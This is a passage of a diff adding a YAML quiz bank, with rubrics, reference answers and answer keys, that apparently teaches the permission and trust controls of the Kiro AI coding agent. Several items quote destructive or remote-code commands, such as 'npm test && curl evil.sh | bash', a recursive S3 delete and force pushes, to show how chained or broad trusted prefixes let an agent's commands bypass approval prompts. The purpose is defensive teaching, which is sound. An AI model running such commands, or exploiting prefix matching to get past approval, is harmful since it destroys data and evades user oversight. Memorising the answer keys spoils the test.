+            Explains that by NOT trusting a broad git prefix, git push is left to prompt;
+            over-trusting comes from too-broad prefixes
+      referenceAnswer: >-
+        Allowlist fs_read so file reads run without prompting. Trust narrow command prefixes for the
+        build/test loop (e.g. "npm test", "npm run build"), not a bare "git" prefix and not
+        universal trust. Because trust is prefix-based, leaving git untrusted (or only trusting "git
+        status"/"git pull") means "git push" still falls outside any trusted prefix and prompts. The
+        way you avoid over-trusting is keeping prefixes specific - a too-broad prefix like "git"
+        would silently cover push.
+      passThreshold: 0.6
+    guidance: >-
+      Least privilege here is: broad read, narrow command prefixes, nothing covering push.
+      Specificity of the trusted prefix is what keeps the dangerous command gated.
+  - id: kat-300-ff-b
+    tier: 300
+    bloom: apply
+    difficulty: 350
+    type: free_form
+    prompt: >-
+      You are onboarding a junior developer to a production codebase using Kiro. Recommend a mode
+      and a trust posture for their first week, and justify each choice.
+    rubric:
+      criteria:
+        - id: c1
+          text: Recommends Supervised mode so each edit is reviewed before landing
+        - id: c2
+          text: Recommends conservative trust (keep write/shell/aws prompting; avoid universal trust)
+        - id: c3
+          text: Justifies via blast radius / learning, and notes they can loosen as confidence grows
+      referenceAnswer: >-
+        Use Supervised mode so every edit-containing turn pauses for review, and keep a conservative
+        trust posture: leave write, shell, and aws prompting and avoid universal trust. This caps
+        blast radius in a production codebase and lets the junior learn what Kiro proposes before it
+        lands. As their judgment and the task predictability grow, they can trust specific safe
+        command prefixes or move to Autopilot for routine work.
+      passThreshold: 0.6
+    guidance: >-
+      Match autonomy to risk and experience: low trust + Supervised for high-stakes/low-experience,
+      loosening deliberately rather than starting with blanket trust.
+  - id: kat-300-ff-c
+    tier: 300
+    bloom: apply
+    difficulty: 362
+    type: free_form
+    prompt: >-
+      A repo you cloned ships an agent definition that lists broad command patterns it wants
+      pre-approved. Walk through what Kiro actually does when that agent tries to run a command you
+      never trusted, and why the repo's request does not automatically grant it.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            States trust is a local user decision (Trusted Commands setting / session trust), not
+            something a cloned repo carries
+        - id: c2
+          text: >-
+            Notes Kiro still requires approval by default for commands you have not trusted on your
+            machine
+        - id: c3
+          text: >-
+            Concludes the command triggers the approval prompt (y/n/Tab); nothing the repo shipped
+            silently authorized it
+      referenceAnswer: >-
+        A cloned repo cannot grant trust, because trust is a local user decision (your Trusted
+        Commands setting and any /tools trust you grant in the session), not a file the repo carries
+        onto your machine. By default Kiro requires approval before running any command, so when the
+        agent proposes a command that is not on your local trusted patterns, Kiro shows the approval
+        prompt (y to approve, n to reject, Tab for options). The repo's "requested" patterns are not
+        your trust; nothing it shipped authorized the command.
+      passThreshold: 0.6
+    guidance: >-
+      Per-user trust isolation means a hostile or unfamiliar repo cannot self-authorize. Anything it
+      did not pre-earn on your machine still hits the approval prompt.
+  - id: kat-300-ff-d
+    tier: 300
+    bloom: apply
+    difficulty: 374
+    type: free_form
+    prompt: >-
+      You trusted the prefix "git" (with a wildcard) earlier. Kiro now wants to run "git push
+      --force origin main". Describe whether it prompts, and how you should have scoped trust
+      differently to keep force pushes confirmed.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            States a "git *" prefix matches any string starting with git, including git push
+            --force, so it would NOT prompt
+        - id: c2
+          text: >-
+            Recommends trusting only specific safe prefixes (e.g. "git pull", "git status") instead
+            of the broad "git" prefix
+        - id: c3
+          text: >-
+            Notes prefix matching is the mechanism - a broader prefix silently covers more
+            subcommands
+      referenceAnswer: >-
+        Because prefix matching only checks that the command starts with your trusted string, "git
+        *" matches "git push --force ...", so Kiro would run it without prompting. To keep force
+        pushes gated you should never trust the bare "git" prefix; trust only the specific safe
+        prefixes you actually need, like "git pull" and "git status". Then "git push" does not start
+        with any trusted prefix and still hits the approval prompt. The lesson is that a broad
+        prefix silently covers every subcommand under it.
+      passThreshold: 0.6
+    guidance: >-
+      Prefix trust is only as safe as the prefix is specific. A bare "git" prefix covers push
+      --force; narrow prefixes keep the destructive subcommands prompting.
+  - id: kat-300-ff-e
+    tier: 300
+    bloom: apply
+    difficulty: 332
+    type: free_form
+    prompt: >-
+      Kiro asks to run 'aws s3 rm s3://prod-bucket --recursive'. You are in Autopilot. Describe the
+      safest immediate response and one configuration choice that keeps destructive aws calls gated
+      in future.
+    rubric:
+      criteria:
+        - id: c1
+          text: 'Immediate: press n to decline the approval prompt'
+        - id: c2
+          text: >-
+            Notes Autopilot does not auto-approve commands - by default all commands require
+            approval, so this destructive call still prompts unless you trusted a covering pattern
+        - id: c3
+          text: >-
+            Future: do not trust a broad aws/command prefix that would cover destructive calls; keep
+            aws prompting (or trust only narrow, safe aws prefixes)
+      referenceAnswer: >-
+        Press n to decline. Autopilot governs edit-review cadence, not command trust - by default
+        Kiro requires approval before running any command, so even in Autopilot this destructive aws
+        call surfaces a prompt unless you previously trusted a pattern covering it. To keep it
+        gated, do not trust a broad prefix like "aws" (which would cover "aws s3 rm"); leave aws
+        prompting, or trust only narrow safe prefixes you actually use, so destructive invocations
+        always confirm.
+      passThreshold: 0.6
+    guidance: >-
+      Default approval-before-running is the safety net; the failure would be trusting a prefix
+      broad enough to cover the destructive call. Keep aws prefixes narrow or unprompted-only for
+      safe ones.
+  - id: kat-300-ff-f
+    tier: 300
+    bloom: apply
+    difficulty: 320
+    type: free_form
+    prompt: >-
+      Your CI job runs Kiro non-interactively, and it needs to run 'npm publish'. Explain why
+      relying on an interactive approval prompt fails in CI, and how to grant the permission for CI
+      while keeping publishing confirmed when you run Kiro locally.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Explains there is no human in CI to answer an approval prompt, so an un-pre-authorized
+            command stalls or fails
+        - id: c2
+          text: >-
+            Proposes the headless grant: --trust-tools=<categories> (least privilege) or
+            --trust-all-tools, granting permissions upfront in the CI invocation
+        - id: c3
+          text: >-
+            Notes local trust is a separate per-user setting, so not trusting publish locally keeps
+            local confirmation intact
+      referenceAnswer: >-
+        In CI there is no human to answer the approval prompt, so a command Kiro has not been
+        pre-authorized to run will stall or fail. Grant permission upfront in the headless
+        invocation - use --trust-tools=<categories> to allow just what the job needs (least
+        privilege) or --trust-all-tools for a fully trusted ephemeral job. Because local trust is
+        your own per-user setting and independent of the CI flags, not trusting publish locally
+        means your local runs still prompt before publishing.
+      passThreshold: 0.6
+    guidance: >-
+      Headless runs cannot answer prompts, so permissions must be granted via flags upfront.
+      Per-user trust isolation lets CI (flag-granted) and local (prompt-gated) keep different
+      postures.
+  - id: kat-300-ff-g
+    tier: 300
+    bloom: apply
+    difficulty: 321
+    type: free_form
+    prompt: >-
+      Describe how you would let Kiro run 'docker build' and 'docker run' commands without prompts
+      but still confirm any 'docker push', using trusted command prefixes.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Trust the specific safe prefixes: "docker build" and "docker run" (with wildcards for
+            args)
+        - id: c2
+          text: Do NOT trust the broad "docker" prefix (it would cover push)
+        - id: c3
+          text: Leave docker push untrusted so it still prompts
+      referenceAnswer: >-
+        Trust the specific prefixes "docker build *" and "docker run *". Crucially, do not trust the
+        broad "docker *" prefix, because prefix matching would then also cover "docker push". Since
+        "docker push" does not start with any trusted prefix, it stays gated and still hits the
+        approval prompt.
+      passThreshold: 0.6
+    guidance: >-
+      Specific prefixes per subcommand keep push gated; a broad "docker" prefix would over-grant.
+      Prefix specificity is how you carve out the dangerous subcommand.
+  - id: kat-300-mc-a
+    tier: 300
+    bloom: apply
+    difficulty: 322
+    type: multiple_choice
+    prompt: >-
+      You will run Kiro non-interactively for a long unattended migration and want zero prompts.
+      Which approach achieves that most directly?
+    choices:
+      - id: a
+        text: Run it headless with --trust-all-tools
+      - id: b
+        text: Run /tools reset first
+      - id: c
+        text: Switch the chat to Supervised mode
+      - id: d
+        text: Run /tools untrust shell
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      For an unattended run, headless mode with --trust-all-tools auto-approves every tool call.
+      reset and untrust do the opposite; Supervised adds review pauses, not fewer. Use
+      --trust-all-tools only when the run is safe; otherwise --trust-tools.
+  - id: kat-300-mc-b
+    tier: 300
+    bloom: apply
+    difficulty: 328
+    type: multiple_choice
+    prompt: >-
+      You want Kiro to run any "npm" command without prompting but still confirm everything else.
+      Which trusted command pattern should you choose?
+    choices:
+      - id: a
+        text: Universal trust - a bare wildcard
+      - id: b
+        text: Prefix - "npm *"
+      - id: c
+        text: Exact match - "npm install left-pad"
+      - id: d
+        text: Untrust the shell tool
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      A prefix pattern "npm *" covers any command starting with npm while leaving other commands
+      prompting. Universal trust would trust everything; an exact match would only trust that one
+      literal line.
+  - id: kat-300-mc-c
+    tier: 300
+    bloom: apply
+    difficulty: 334
+    type: multiple_choice
+    prompt: >-
+      Kiro's trusted-commands matching is prefix-based and has no deny patterns. If you want most
+      commands to run freely but deletions like "rm" to always prompt, what is the correct approach?
+    choices:
+      - id: a
+        text: Trust universally, then somehow add a deny for rm
+      - id: b
+        text: >-
+          You cannot express "all except rm" with a deny; instead trust only the specific safe
+          prefixes you use and leave rm (and everything else) to prompt
+      - id: c
+        text: Trust "rm" so it stops prompting
+      - id: d
+        text: Switch to Supervised mode, which blocks rm
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      There are no deny patterns - matching is allow-by-prefix only. So you cannot carve "rm" out of
+      a universal trust. The safe design is to trust narrow prefixes for the commands you actually
+      run, leaving rm and any unanticipated command still gated by a prompt.
+  - id: kat-300-mc-d
+    tier: 300
+    bloom: apply
+    difficulty: 340
+    type: multiple_choice
+    prompt: >-
+      A teammate cloned your repo and complains Kiro keeps prompting for permissions you "already
+      trusted." What is the correct explanation and fix?
+    choices:
+      - id: a
+        text: They must copy your local trust settings into the repository
+      - id: b
+        text: They should run git pull again to sync trust rules
+      - id: c
+        text: Trust only works in Autopilot, so they must switch modes
+      - id: d
+        text: >-
+          Trust is a local per-user setting, not carried by the repo, so each user must establish
+          their own trust; the repo cannot ship it
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Trust is a local user decision (the Trusted Commands setting and session /tools trust), not a
+      repo artifact, by design. Each teammate establishes trust locally; you cannot ship it to them.
+  - id: kat-300-mc-e
+    tier: 300
+    bloom: apply
+    difficulty: 346
+    type: multiple_choice
+    prompt: >-
+      You are reviewing each AI edit carefully before it lands and want to accept some hunks and
+      reject others. Which mode and feature do you use?
+    choices:
+      - id: a
+        text: >-
+          Supervised mode, which yields after each turn that contains file edits so you can review
+          and accept or reject the changes before they land
+      - id: b
+        text: Autopilot mode with everything trusted
+      - id: c
+        text: Read-only mode
+      - id: d
+        text: /tools reset after every edit
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Supervised mode is the change-review workflow: it pauses after edit-containing turns so you
+      approve changes before they land. Autopilot defers review to an after-the-fact diff (View all
+      changes / Revert).
+  - id: kat-300-mc-f
+    tier: 300
+    bloom: apply
+    difficulty: 352
+    type: multiple_choice
+    prompt: >-
+      You want a CI pipeline to run Kiro fully non-interactively with broad access. Which headless
+      flag is the documented way to do it?
+    choices:
+      - id: a
+        text: '--confirm=ask'
+      - id: b
+        text: '--trust-all-tools'
+      - id: c
+        text: '--deny-shell'
+      - id: d
+        text: '--supervised'
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      For CI that needs full access with no human present, --trust-all-tools auto-approves every
+      tool call. Anything that waits for a prompt would stall, since no one can answer. For least
+      privilege, prefer --trust-tools=<categories>.
+  - id: kat-300-mc-g
+    tier: 300
+    bloom: apply
+    difficulty: 356
+    type: multiple_choice
+    prompt: >-
+      Kiro keeps prompting as it writes many files and you do not want to approve each one. Without
+      permanently trusting write in your settings, what is the session-only way to stop the repeated
+      prompts?
+    choices:
+      - id: a
+        text: Press y separately for every single write
+      - id: b
+        text: >-
+          At the prompt, press Tab and trust the write tool (or a matching pattern) for this session
+          via /tools
+      - id: c
+        text: Edit the repo's permissions file
+      - id: d
+        text: Press n, then re-issue the request
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Tab at the prompt drills into options, including trusting the tool/pattern; /tools trust does
+      the same. This trust is session runtime state - /tools reset or a new session clears it - so
+      it does not persist like the Trusted Commands setting.
+  - id: kat-300-mc-h
+    tier: 300
+    bloom: apply
+    difficulty: 360
+    type: multiple_choice
+    prompt: >-
+      You want low-friction edits in ./src but extra caution around ./infra. Given Kiro's permission
+      model, which approach is the most realistic?
+    choices:
+      - id: a
+        text: Trust write universally so nothing ever prompts
+      - id: b
+        text: >-
+          Run mostly in Supervised so every edit (including infra) is reviewed before it lands, and
+          avoid trusting write broadly
+      - id: c
+        text: Trust write for ./src only and assume ./infra is automatically blocked
+      - id: d
+        text: Disable the write tool entirely
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Kiro's trust is prefix/command-based, not per-directory deny rules, so the dependable way to
+      keep infra changes reviewed is Supervised mode plus not broadly trusting write. Mode (review
+      every edit) is the available lever here, not a per-path deny.
+  - id: kat-300-mc-i
+    tier: 300
+    bloom: apply
+    difficulty: 366
+    type: multiple_choice
+    prompt: >-
+      You trusted the exact command "make build". Kiro now proposes "make build && rm -rf
+      node_modules". Given that Kiro's trusted-command matching does NOT parse chains, what is the
+      safe assumption about how to set up trust?
+    choices:
+      - id: a
+        text: >-
+          Trusting a prefix can match a chained line whose trusted part comes first, so a too-loose
+          trusted pattern may let the appended rm run - keep trusted patterns specific and do not
+          rely on chain isolation
+      - id: b
+        text: The && is always split apart, so only the rm half prompts
+      - id: c
+        text: The whole line is automatically blocked because it is compound
+      - id: d
+        text: Only "rm -rf node_modules" runs and the build is skipped
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Kiro uses prefix matching and does not analyze chains or special characters. A trusted prefix
+      that the chained line starts with can let the whole line through, including a dangerous
+      appended command. Defend by keeping trusted patterns narrow, not by assuming Kiro splits the
+      chain.
+  - id: kat-300-mc-j
+    tier: 300
+    bloom: apply
+    difficulty: 330
+    type: multiple_choice
+    prompt: >-
+      You accidentally trusted the shell tool entirely and want to undo it for the rest of this
+      session without restarting. What is the cleanest command?
+    choices:
+      - id: a
+        text: /tools trust shell
+      - id: b
+        text: /tools untrust shell
+      - id: c
+        text: /clear
+      - id: d
+        text: Quit and restart, losing your conversation
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      /tools untrust shell returns shell to prompting without disturbing other tools. /tools reset
+      would also work but resets everything; /clear and restarting are unnecessary and lose context.
+  - id: kat-300-mc-k
+    tier: 300
+    bloom: apply
+    difficulty: 372
+    type: multiple_choice
+    prompt: >-
+      You want an MCP server's "search" tool to run without prompts but keep its "delete" tool
+      prompting. Where do you express that a specific tool may run without prompting?
+    choices:
+      - id: a
+        text: 'Set "disabled": true on the whole server'
+      - id: b
+        text: >-
+          In the agent config, add the search tool to allowedTools and leave delete out so it still
+          prompts
+      - id: c
+        text: Trust the entire shell tool
+      - id: d
+        text: There is no way to control individual MCP tools
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      allowedTools (in the agent config) lists tools that may run without prompting, including MCP
+      tools referenced as "@server/tool". List only search; delete, being absent, still prompts. The
+      MCP server config itself only offers a server-level "disabled" toggle.
+  - id: kat-300-mc-l
+    tier: 300
+    bloom: apply
+    difficulty: 344
+    type: multiple_choice
+    prompt: >-
+      For a read-heavy research task, you want Kiro to read files without prompting but stay
+      cautious about writes. Which allowedTools posture fits a least-privilege approach?
+    choices:
+      - id: a
+        text: Add every tool to allowedTools so nothing prompts
+      - id: b
+        text: Add only read (fs_read) to allowedTools, leaving write and shell to prompt
+      - id: c
+        text: Add write but not read
+      - id: d
+        text: Leave allowedTools empty and trust everything universally instead
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Broaden only what you need: allowlist the non-mutating fs_read so reads are frictionless, and
+      keep write/shell prompting so any state change is still gated. Allowlisting everything throws
+      away the least-privilege benefit.
+  - id: kat-300-mc-m
+    tier: 300
+    bloom: apply
+    difficulty: 368
+    type: multiple_choice
+    prompt: >-
+      A long Autopilot run is heading somewhere wrong and you want to stop it immediately and take
+      over. What do you do?
+    choices:
+      - id: a
+        text: Run /tools reset to halt it
+      - id: b
+        text: Switch to Supervised mode, which retroactively undoes the run
+      - id: c
+        text: Interrupt Autopilot mid-execution to regain manual control
+      - id: d
+        text: Press No at the next permission prompt, which ends the session
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      Autopilot supports interrupting mid-execution to regain manual control. /tools reset only
+      changes permissions; switching modes does not retroactively undo work; a No only declines one
+      tool call.
+  - id: kat-400-ff-a
+    tier: 400
+    bloom: analyze
+    difficulty: 436
+    type: free_form
+    prompt: >-
+      A user reports: "I ran Kiro headless with --trust-all-tools in Autopilot, and it deleted files
+      in a sibling directory outside my project." Analyze how each setting contributed and identify
+      the single change that would most reduce the blast radius next time.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Explains --trust-all-tools removed the approval gate on write/shell, so destructive
+            commands ran unprompted
+        - id: c2
+          text: >-
+            Explains Autopilot ran end-to-end with no per-step pause, and headless meant no human
+            could intervene
+        - id: c3
+          text: >-
+            Identifies a single highest-impact change (e.g. replace --trust-all-tools with
+            --trust-tools for only the needed categories, or run in a constrained directory)
+      referenceAnswer: >-
+        --trust-all-tools removed the approval gate on every tool, so destructive write/shell
+        commands ran with no prompt; Autopilot ran the task end-to-end with no per-step pause, and
+        headless mode meant there was no human to catch it. Trusted-command prefixes did not help
+        because everything was trusted. The single highest-impact change is to stop using
+        --trust-all-tools and instead pass --trust-tools=<categories> granting only what the job
+        needs, so anything outside that set still requires explicit permission.
+      passThreshold: 0.6
+    guidance: >-
+      Blanket trust plus autonomous, unattended execution removed every gate at once. The fix
+      targets the broadest lever (--trust-all-tools) and replaces it with least-privilege
+      --trust-tools.
+  - id: kat-400-ff-b
+    tier: 400
+    bloom: analyze
+    difficulty: 452
+    type: free_form
+    prompt: >-
+      A user has trusted a broad set of shell command prefixes and argues that this should also let
+      the agent silently overwrite mcp.json (a protected path). Break down why the argument fails on
+      two distinct grounds.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Notes a category mismatch - trusting shell command prefixes authorizes running commands,
+            not file writes to a config file
+        - id: c2
+          text: >-
+            Notes mcp.json is a hardcoded protected path that always requires approval and cannot be
+            overridden by trusting commands
+        - id: c3
+          text: Concludes the write to mcp.json still prompts the user
+      referenceAnswer: >-
+        First, a category mismatch: trusting shell command prefixes authorizes running commands, not
+        file-write operations; overwriting mcp.json is a write, which trusted command prefixes never
+        cover. Second, even a relevant trust could not win, because mcp.json is one of Kiro's
+        hardcoded protected paths that always require approval - that gate cannot be overridden by
+        any trust setting. So the write to mcp.json still prompts the user.
+      passThreshold: 0.6
+    guidance: >-
+      The argument conflates command trust with file-write permission and ignores the
+      non-overridable protected-path gate. Two separate protections both defeat it.
+  - id: kat-400-ff-c
+    tier: 400
+    bloom: analyze
+    difficulty: 464
+    type: free_form
+    prompt: >-
+      Kiro's trusted-command matching uses simple string prefix matching and does NOT analyze
+      command structure, chains, or special characters. Analyze the security risk this creates, give
+      one concrete attack it enables, and explain how a user should mitigate it.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Explains that because chains are not parsed, a trusted prefix can match a whole chained
+            line and authorize an appended dangerous command
+        - id: c2
+          text: >-
+            Gives a concrete attack (e.g. a model proposes "npm test && curl evil.sh | bash" and a
+            trusted "npm test" prefix lets the whole line run)
+        - id: c3
+          text: >-
+            Mitigation - keep trusted prefixes narrow/specific, avoid broad prefixes, and do not
+            assume Kiro isolates the safe half of a chain
+      referenceAnswer: >-
+        Because matching is prefix-based and does not split on ; && || |, a trusted prefix that a
+        chained line starts with can let the entire line run, including an appended dangerous
+        command. For example, if a model proposes "npm test && curl evil.sh | bash" and you trusted
+        the prefix "npm test", the whole line can match and run the curl|bash. The mitigation is to
+        keep trusted prefixes narrow and specific (so a chain does not start with a trusted prefix
+        you did not intend), avoid broad prefixes, and never assume Kiro will isolate the safe half
+        - it will not.
+      passThreshold: 0.6
+    guidance: >-
+      Prefix matching with no chain analysis is a documented limitation, not a safeguard: trust can
+      transit a chain. Defend with narrow prefixes, not by assuming Kiro splits the command.
+  - id: kat-400-ff-d
+    tier: 400
+    bloom: analyze
+    difficulty: 478
+    type: free_form
+    prompt: >-
+      A user trusted a command with /tools during a chat, started a fresh session the next day, and
+      is confused that Kiro prompts for the same command again. Diagnose the lifetime/scope
+      confusion and how to make the trust durable.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Identifies that /tools trust is session-scoped runtime state, cleared by /tools reset or
+            a new session
+        - id: c2
+          text: >-
+            Notes that durable, cross-session trust lives in the persistent Trusted Commands
+            setting, a different place than the session trust
+        - id: c3
+          text: >-
+            Recommends adding the pattern to the persistent setting (not relying on per-session
+            /tools trust) when the trust should survive restarts
+      referenceAnswer: >-
+        /tools trust grants trust only for the current session - it is runtime state that a new
+        session (or /tools reset) clears, which is why the next day's session prompts again. Durable
+        trust that survives restarts is a different thing: it lives in the persistent Trusted
+        Commands setting. The fix is to add the command pattern to that persistent setting rather
+        than re-trusting it each session, reserving /tools trust for one-off convenience within a
+        single chat.
+      passThreshold: 0.6
+    guidance: >-
+      The pitfall is conflating session-scoped /tools trust with the persistent Trusted Commands
+      setting. Durable trust must go in the setting; /tools trust evaporates with the session.
+  - id: kat-400-ff-e
+    tier: 400
+    bloom: analyze
+    difficulty: 422
+    type: free_form
+    prompt: >-
+      A user trusted everything (universal command trust) and then switched the chat to Supervised
+      mode, complaining it 'did nothing to stop the tool calls.' Explain why, distinguishing what
+      each control governs.
+    rubric:
+      criteria:
+        - id: c1
+          text: Explains universal trust removed the approval gate for commands across the session
+        - id: c2
+          text: >-
+            Explains Supervised only gates turns containing file EDITS and is explicitly a
+            code-review workflow, not a security control
+        - id: c3
+          text: >-
+            Concludes trusted commands still run; to re-gate them you must untrust (/tools untrust
+            or reset), not change mode
+      referenceAnswer: >-
+        Universal trust removed the approval gate, so commands run without prompting. Switching to
+        Supervised only adds a review pause after turns that contain file edits - and Supervised is
+        documented as a code-review workflow, not a security control, so it does not re-impose
+        command approval. Trusted shell/aws commands therefore still execute. To re-gate them the
+        user must /tools untrust the tool (or /tools reset), because mode (edit review) and trust
+        (what runs) are independent.
+      passThreshold: 0.6
+    guidance: >-
+      Supervised gates edit review, not command trust, and is not a security control. After trusting
+      everything, only untrust/reset restores the gate; changing mode does not.
+  - id: kat-400-ff-f
+    tier: 400
+    bloom: analyze
+    difficulty: 423
+    type: free_form
+    prompt: >-
+      Analyze the failure mode of trusting very broad command prefixes (or universal trust) on the
+      assumption that 'anything truly dangerous will be obvious enough to catch in the moment.'
+      Identify the security property this violates and a concrete scenario where it bites.
+    rubric:
+      criteria:
+        - id: c1
+          text: Identifies it as a fail-open posture that violates least privilege / default-deny
+        - id: c2
+          text: >-
+            Notes that with broad trust (and no deny patterns available), any command matching the
+            broad prefix runs unprompted, including unforeseen dangerous ones
+        - id: c3
+          text: >-
+            Gives a concrete bite, e.g. a destructive subcommand or flag the user never anticipated
+            runs because it falls under the broad trusted prefix
+      referenceAnswer: >-
+        Broad/universal trust is fail-open: because Kiro's trusted-commands matching is prefix-based
+        with no deny patterns, anything that starts with the trusted prefix runs without prompting -
+        including operations you never anticipated. This violates least privilege / default-deny.
+        Concretely, trusting a bare "git" prefix later silently authorizes "git push --force" or
+        "git clean -fdx", and trusting "aws" authorizes "aws s3 rm --recursive". The safe posture is
+        the opposite: trust narrow, specific prefixes for exactly the commands you run, and let
+        everything else keep prompting.
+      passThreshold: 0.6
+    guidance: >-
+      Broad trust fails open on the unforeseen, and there are no deny patterns to rescue you. The
+      fix is least privilege - narrow, specific trusted prefixes - so anything unexpected still
+      gates.
+  - id: kat-400-ff-g
+    tier: 400
+    bloom: analyze
+    difficulty: 470
+    type: free_form
+    prompt: >-
+      A teammate wants to "trust everything except commands with --force" and assumes they can add a
+      trusted universal pattern plus some exception for --force. Given that Kiro's trusted-commands
+      matching is prefix-based with no deny/exception patterns, explain why this plan cannot work
+      and what to do instead.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Explains there are no deny/exception patterns - matching only adds allowed prefixes, it
+            cannot subtract
+        - id: c2
+          text: >-
+            Explains universal trust would cover --force commands too, with no way to carve them
+            back out
+        - id: c3
+          text: >-
+            Recommends the inverse - trust only narrow specific prefixes for safe commands, leaving
+            --force (and anything else) to prompt
+      referenceAnswer: >-
+        The plan cannot work because Kiro's trusted-commands matching only adds allowed prefixes;
+        there is no deny or exception pattern to subtract a dangerous case. If you trust
+        universally, every command including ones with --force runs unprompted, and nothing can claw
+        the --force case back. The correct approach is the inverse of "trust all minus exceptions":
+        trust only the specific safe prefixes you actually use, so commands with --force - and any
+        other command you did not explicitly trust - still hit the approval prompt.
+      passThreshold: 0.6
+    guidance: >-
+      Trusted-commands matching is additive-only (allow prefixes), with no deny. You cannot express
+      "all except X"; you express "only these," leaving everything else gated.
+  - id: kat-400-mc-a
+    tier: 400
+    bloom: analyze
+    difficulty: 424
+    type: multiple_choice
+    prompt: >-
+      A user trusted the prefix "rm" expecting Kiro to "be smart and still confirm dangerous rm
+      -rf." Why does Kiro run "rm -rf /tmp/build" without prompting?
+    choices:
+      - id: a
+        text: >-
+          Trusted-commands matching is prefix-based and does not analyze danger or flags; "rm -rf
+          ..." starts with the trusted "rm" prefix, so it runs
+      - id: b
+        text: rm is always denied by default, so this cannot happen
+      - id: c
+        text: Kiro detects -rf and adds a confirmation automatically
+      - id: d
+        text: Only commands inside the working directory are trusted
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Prefix matching does not understand flags or danger. Trusting "rm" trusts everything starting
+      with rm, including rm -rf. There is no built-in "dangerous flag" detection, so do not trust
+      broad prefixes for destructive commands.
+  - id: kat-400-mc-b
+    tier: 400
+    bloom: analyze
+    difficulty: 432
+    type: multiple_choice
+    prompt: >-
+      Kiro proposed "curl http://internal | bash" and the user had trusted the prefix "curl". Given
+      that Kiro's matching does not analyze pipes or chains, diagnose the real risk.
+    choices:
+      - id: a
+        text: There is no risk because curl was trusted
+      - id: b
+        text: >-
+          Because the line starts with the trusted "curl" prefix and Kiro does not split on the
+          pipe, the entire "curl ... | bash" can run unprompted - executing remote code
+      - id: c
+        text: The pipe is split so only the safe curl half runs
+      - id: d
+        text: bash is always denied by default, so the line is blocked
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
+      Prefix matching does not isolate the bash half - it sees a line starting with the trusted
+      "curl" prefix and can let the whole thing run, piping remote content into bash. Trusting
+      "curl" is dangerous precisely because chains are not parsed.
+  - id: kat-400-mc-c
+    tier: 400
+    bloom: analyze
+    difficulty: 440
+    type: multiple_choice
+    prompt: >-
+      A user trusts a very broad set of commands to reduce friction, then is surprised the agent
+      still prompts before modifying mcp.json. What explains this?
+    choices:
+      - id: a
+        text: Broad command trust does not cover file writes at all
+      - id: b
+        text: mcp.json is read-only on the filesystem
+      - id: c
+        text: >-
+          mcp.json is a hardcoded protected path that always requires approval, which trusting
+          commands cannot override
+      - id: d
+        text: The user lacked admin rights
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: >-
+      mcp.json is one of Kiro's protected paths (alongside .git/, .vscode/, .code-workspace,
+      .kiroignore). It always requires approval so the agent cannot silently change which
+      tools/servers it has - no amount of command trust overrides that.
+  - id: kat-400-mc-d
+    tier: 400
+    bloom: analyze
+    difficulty: 448
+    type: multiple_choice
+    prompt: >-
+      A team ships a repo expecting teammates to "inherit" trusted commands by committing a trust
+      file into the repo. Why will this fail to grant trust on a teammate's machine?
+    choices:
+      - id: a
+        text: The file must be JSON, not YAML
+      - id: b
+        text: Committed files are always denied by Kiro
+      - id: c
+        text: It works fine; the premise is correct
+      - id: d
+        text: >-
+          Trust is a local per-user decision (the Trusted Commands setting / session /tools), not
+          read from a file the repo carries, so a committed file is not treated as trust
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: >-
+      Kiro does not treat a committed repo file as trust configuration. Trust is per-user and
+      machine-local precisely so a repo cannot inject it; each teammate must establish trust on
+      their own machine.
+  - id: kat-400-mc-e
+    tier: 400
+    bloom: analyze
+    difficulty: 456
+    type: multiple_choice
+    prompt: >-
+      A user in Autopilot says "I never approved that risky shell command, so Autopilot is buggy."
+      What is the most likely correct diagnosis?
+    choices:
+      - id: a
+        text: >-
+          Autopilot by design does not prompt per step; the command ran under autonomous execution,
+          and the user's recourse is the after-the-fact diff, revert, and interrupt
+      - id: b
+        text: Autopilot must always prompt, so this is a genuine bug
+      - id: c
+        text: The command could only run if /tools reset was called
+      - id: d
+        text: Autopilot only runs read operations, so no shell could have run
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: >-
+      Autopilot's whole premise is acting without per-step approval. The "missing approval" is
+      expected behavior, not a bug; oversight in Autopilot is via diff/revert/interrupt, plus
+      permission rules if set.
+  - id: kat-400-mc-f
+    tier: 400
+    bloom: analyze
+    difficulty: 460
+    type: multiple_choice
+    prompt: >-
+      Compare: (A) using /tools trust on "git push *" during a chat vs (B) adding "git push *" to
+      the persistent Trusted Commands setting. Which statement is accurate?
+    choices:
+      - id: a
+        text: They are identical in effect and lifetime
+      - id: b
+        text: >-
+          Both remove the confirmation for pushes, but A lasts only the current session while B
+          persists across sessions until you remove it
+      - id: c
+        text: B blocks pushes; A allows them
+      - id: d
+        text: A persists across sessions; B is session-only
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: >-
